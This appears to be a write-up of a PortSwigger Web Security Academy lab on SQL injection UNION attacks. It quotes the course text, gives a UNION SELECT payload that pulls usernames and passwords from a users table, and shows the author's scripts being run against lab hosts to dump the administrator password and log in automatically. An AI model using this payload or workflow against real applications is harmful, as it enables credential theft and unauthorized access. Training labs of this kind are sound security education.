# Using an SQL injection UNION attack to retrieve interesting data

When you have determined the number of columns returned by the original query and found which columns can hold string data, you are in a position to retrieve interesting data.

Suppose that:

- The original query returns two columns, both of which can hold string data.
- The injection point is a quoted string within the  `WHERE`  clause.
- The database contains a table called  `users`  with the columns  `username`  and  `password`.

In this situation, you can retrieve the contents of the  `users`  table by submitting the input:

`' UNION SELECT username, password FROM users--`

Of course, the crucial information needed to perform this attack is that there is a table called  `users`  with two columns called  `username`  and  `password`. Without this information, you would be left trying to guess the names of tables and columns. In fact, all modern databases provide ways of examining the database structure, to determine what tables and columns it contains.

# Lab: SQL injection UNION attack, retrieving data from other tables

This lab contains an SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you need to combine some of the techniques you learned in previous labs.

The database contains a different table called  `users`, with columns called  `username`  and  `password`.

To solve the lab, perform an  [SQL injection UNION](https://portswigger.net/web-security/sql-injection/union-attacks)  attack that retrieves all usernames and passwords, and use the information to log in as the  `administrator`  user.

# PoC
To detect the sqli vulnerability, we can perform the previous lab to determine number of columns on the database, then determine the data type of the columns. here below with the following command to detect string column on the target
```bash
$ python3 sqli_lab_04.py https://accf1f841eb3a800c0c1748200d60051.web-security-academy.net/

    >> SQL injection UNION attack, finding a column containing text
    >> by Port Swigger Academy

[*] Figuring out number of columns...
[✓] The number of columns is 2.
[*] Figuring out which column contains text...
[✓] The column that contains text is 1.
```
now, we need to retrieve `username` and `password` columns on the target.
```bash
$ python3 sqli_lab_05.py https://ac9b1f3b1fae8e8fxxxxxxxxxxx.web-security-academy.net

    >> SQL injection UNION attack, retrieving data from other tables
    >> by Port Swigger Academy

[*]  Dumping the list of usernames and passwords...
[✓]  Found the administrator password.
[✓]  The administrator password is '9ybyx7eulvih2i33gzn9'
```
we add a new automation script. it will be automate login as an administrator after it got an administrator password

```bash
$ python3 sqli_lab_05a.py "https://aca91fb91fc3b216c00c29bb00e70085.web-security-academy.net"

    >> SQL injection UNION attack, retrieving data from other tables
    >> by Port Swigger Academy

[*]  Dumping the list of usernames and passwords...
[✓]  The administrator password is 's35lhylr12py2yuvv2il'
[*] Try to login as an Administrator...
[✓] We have logged as an Administrator!
```